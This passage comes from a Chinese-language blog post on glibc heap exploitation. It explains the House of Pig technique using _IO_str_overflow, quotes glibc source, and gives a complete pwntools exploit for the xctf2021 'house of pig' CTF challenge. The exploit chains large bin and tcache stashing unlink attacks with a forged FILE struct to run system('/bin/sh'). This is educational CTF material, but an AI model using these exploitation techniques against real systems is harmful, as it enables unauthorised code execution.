<p><strong>适用情况:</strong>只有calloc函数,glibc231以上</p>
<p><strong>有效版本:</strong></p>
<h2 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h2><p>主要利用的函数为 <code>_IO_str_overflow</code></p>
<p>利用流程为</p>
<ol>
<li>进行一个 Tcache Stash Unlink+ 攻击，把地址 <code>__free_hook - 0x10</code> 写入 tcache_pthread_struct。由于该攻击要求 <code>__free_hook - 0x8</code> 处存储一个指向可写内存的指针，所以在此之前需要进行一次 large bin attack。</li>
<li>再进行一个 large bin attack，修改 <code>_IO_list_all</code> 为一个堆地址，然后在该处伪造 <code>_IO_FILE</code> 结构体。</li>
<li>通过伪造的结构体触发 <code>_IO_str_overflow</code> getshell。</li>
</ol>
<p>这是_IO_str_overflow的源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">char</span> *new_buf;</span><br><span class="line">	  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">	  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">	  <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">	  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line">	  new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">	      <span class="keyword">return</span> EOF;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">	      <span class="built_in">free</span> (old_buf);</span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">	  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">	  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">	  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">	  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">	  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">	  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure>
<p>重点看这部分</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line"><span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line"><span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line"><span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">  <span class="keyword">return</span> EOF;</span><br><span class="line">new_buf = <span class="built_in">malloc</span> (new_size);</span><br><span class="line"><span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/*	  __ferror(fp) = 1; */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (old_buf)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">    <span class="built_in">free</span> (old_buf);</span><br><span class="line">    <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">    fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>构造 FILE 结构的时候，重点是将其 <strong>vtable 由 _IO_file_jumps 修改为 _IO_str_jumps，那么当原本应该调用 IO_file_overflow 的时候，就会转而调用如下的 IO_str_overflow。</strong></p>
<p>而该函数是以传入的 FILE 地址本身为参数的，同时其中会连续调用 malloc,memcpy,free三个函数，且三个函数的参数又都可以被该 FILE 结构中的数据控制。</p>
<p>那么适当的构造 FILE 结构中的数据，就可以实现</p>
<ol>
<li>利用 IO_str_overflow 函数中的 <code>malloc</code> 申请出那个已经被放入到 tcache 链表的头部的包含 <code>__free_hook</code> 的 fake chunk；</li>
<li>紧接着可以将提前在堆上布置好的数据，通过 IO_str_overflow 函数中的<code>memcpy</code> 写入到刚刚申请出来的包含<code>__free_hook</code>的这个 chunk，从而能任意控制 <code>__free_hook</code> ，这里可以将其修改为 system函数地址；</li>
<li>最后调用 IO_str_overflow 函数中的 <code>free</code> 时，就能够触发 __free_hook ，同时还能在提前布置堆上数据的时候，使其以字符串 “/bin/sh\x00” 开头，那么最终就会执行 system(“/bin/sh”)。</li>
</ol>
<p>FILE结构的参数应满足</p>
<ol>
<li>_IO_NO_WRITES标志为false,_IO_USER_BUF标志为false</li>
<li>fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base <strong>&gt;=</strong> fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base - 1</li>
<li>fp-&gt;_IO_buf_base指向存储有”/bin/sh”和system地址的chunk,old_buf中的内容复制到new_buf时应注意对应</li>
<li>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base合适</li>
</ol>
<h2 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h2><p><strong>xctf2021-house of pig</strong></p>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/pig&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>程序只使用calloc,这就意味着不会使用tcache</p>
<p>主要的漏洞是在改变猪猪的时候，备份和更新结构体时未对 des_exist_sign[24] 数组更新</p>
<p>也就是说一只猪猪释放了一个chunk后,切换成另一只猪猪再切换回来,就能uaf</p>
<p>c++反编译出来的代码看不太懂</p>
<p>暂时先这样</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pig&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;182.92.203.154&#x27;, 35264)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pig&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : io.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : io.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : io.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : io.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : io.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : io.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(io, text)</span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Menu</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">&#x27;Choice: &#x27;</span>, <span class="built_in">str</span>(cmd))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Add</span>(<span class="params">size, content</span>):</span><br><span class="line">    Menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&#x27;message: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Show</span>(<span class="params">idx</span>):</span><br><span class="line">    Menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    Menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;message: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Del</span>(<span class="params">idx</span>):</span><br><span class="line">    Menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Change</span>(<span class="params">user</span>):</span><br><span class="line">    Menu(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">if</span> user == <span class="number">1</span>:</span><br><span class="line">        sla(<span class="string">&#x27;user:\n&#x27;</span>, <span class="string">&#x27;A\x01\x95\xc9\x1c&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> user == <span class="number">2</span>:</span><br><span class="line">        sla(<span class="string">&#x27;user:\n&#x27;</span>, <span class="string">&#x27;B\x01\x87\xc3\x19&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> user == <span class="number">3</span>:</span><br><span class="line">        sla(<span class="string">&#x27;user:\n&#x27;</span>, <span class="string">&#x27;C\x01\xf7\x3c\x32&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">	gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;source ./libcdebug/loadsym.py</span></span><br><span class="line"><span class="string">	loadsym /home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/.debug/libc-2.31.so</span></span><br><span class="line"><span class="string">	&#x27;&#x27;&#x27;</span>)</span><br><span class="line">	pause()</span><br><span class="line"><span class="comment">#----- prepare tcache_stashing_unlink_attack</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    Add(<span class="number">0x90</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x28</span>) <span class="comment"># B0~B4</span></span><br><span class="line">    Del(x)    <span class="comment"># B0~B4</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Add(<span class="number">0x150</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x68</span>) <span class="comment"># A0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    Add(<span class="number">0x150</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x68</span>) <span class="comment"># A1~A7</span></span><br><span class="line">    Del(<span class="number">1</span>+x)</span><br><span class="line">Del(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">0xb0</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x28</span>) <span class="comment"># B5 split 0x160 to 0xc0 and 0xa0</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Add(<span class="number">0x180</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x78</span>) <span class="comment"># A8</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    Add(<span class="number">0x180</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x78</span>) <span class="comment"># A9~A15</span></span><br><span class="line">    Del(<span class="number">9</span>+x)</span><br><span class="line">Del(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">0xe0</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x38</span>) <span class="comment"># B6 split 0x190 to 0xf0 and 0xa0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- leak libc_base and heap_base</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x158</span>) <span class="comment"># A16</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">0xf0</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x48</span>) <span class="comment"># B7</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Del(<span class="number">16</span>)<span class="comment">#put A16 into unsorted</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Add(<span class="number">0x440</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x158</span>) <span class="comment"># B8   make A16 into largebin</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Show(<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&#x27;message is: &#x27;</span>)</span><br><span class="line">libc_base = uu64(rl()) - <span class="number">0x1ebfe0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">16</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0xf</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">Show(<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&#x27;message is: &#x27;</span>+<span class="string">&#x27;A&#x27;</span>*<span class="number">0xf</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">heap_base = uu64(rl()) - <span class="number">0x13940</span></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- first largebin_attack</span></span><br><span class="line">Edit(<span class="number">16</span>, <span class="number">2</span>*p64(libc_base+<span class="number">0x1ebfe0</span>) + <span class="string">b&#x27;\n&#x27;</span>) <span class="comment"># recover</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x158</span>) <span class="comment"># A17</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x158</span>) <span class="comment"># A18</span></span><br><span class="line">Add(<span class="number">0x430</span>, <span class="string">&#x27;A&#x27;</span>*<span class="number">0x158</span>) <span class="comment"># A19</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Del(<span class="number">8</span>)</span><br><span class="line">Add(<span class="number">0x450</span>, <span class="string">&#x27;B&#x27;</span>*<span class="number">0x168</span>) <span class="comment"># B9</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Del(<span class="number">17</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">Edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p64(free_hook-<span class="number">0x28</span>) +<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">Add(<span class="number">0xa0</span>, <span class="string">&#x27;C&#x27;</span>*<span class="number">0x28</span>) <span class="comment"># C0 triger largebin_attack, write a heap addr to __free_hook-8</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Edit(<span class="number">8</span>, <span class="number">2</span>*p64(heap_base+<span class="number">0x13e80</span>) + <span class="string">b&#x27;\n&#x27;</span>) <span class="comment"># recover</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- second largebin_attack</span></span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line">Add(<span class="number">0x380</span>, <span class="string">&#x27;C&#x27;</span>*<span class="number">0x118</span>) <span class="comment"># C1</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">Del(<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">IO_list_all = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">Edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p64(IO_list_all-<span class="number">0x20</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line">Add(<span class="number">0xa0</span>, <span class="string">&#x27;C&#x27;</span>*<span class="number">0x28</span>) <span class="comment"># C2 triger largebin_attack, write a heap addr to _IO_list_all</span></span><br><span class="line"></span><br><span class="line">Change(<span class="number">2</span>)</span><br><span class="line">Edit(<span class="number">8</span>, <span class="number">2</span>*p64(heap_base+<span class="number">0x13e80</span>) + <span class="string">b&#x27;\n&#x27;</span>) <span class="comment"># recover</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----- tcache_stashing_unlink_attack and FILE attack</span></span><br><span class="line">Change(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x50</span> + p64(heap_base+<span class="number">0x12280</span>) + p64(free_hook-<span class="number">0x20</span>)</span><br><span class="line">Edit(<span class="number">8</span>, payload +<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Change(<span class="number">3</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span> + p64(heap_base+<span class="number">0x147c0</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x158</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">Add(<span class="number">0x440</span>, payload) <span class="comment"># C3 change fake FILE _chain</span></span><br><span class="line">Add(<span class="number">0x90</span>, <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x28</span>) <span class="comment"># C4 triger tcache_stashing_unlink_attack, put the chunk of __free_hook into tcache</span></span><br><span class="line"></span><br><span class="line">IO_str_vtable = libc_base + <span class="number">0x1ED560</span></span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">fake_IO_FILE = <span class="number">2</span>*p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>)                    <span class="comment">#change _IO_write_base = 1</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0xffffffffffff</span>)        <span class="comment">#change _IO_write_ptr = 0xffffffffffff</span></span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)</span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x148a0</span>)                <span class="comment">#v4</span></span><br><span class="line">fake_IO_FILE += p64(heap_base+<span class="number">0x148b8</span>)                <span class="comment">#v5</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)                    <span class="comment">#change _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(IO_str_vtable)        <span class="comment">#change vtable</span></span><br><span class="line">payload = fake_IO_FILE + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="number">2</span>*p64(system_addr)</span><br><span class="line">sa(<span class="string">&#x27;Gift:&#x27;</span>, payload)</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">Menu(<span class="number">5</span>)</span><br><span class="line">sla(<span class="string">&#x27;user:\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure>
<h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h1><h2 id="概要-7"><a href="#概要-7" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>House of Spirit的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
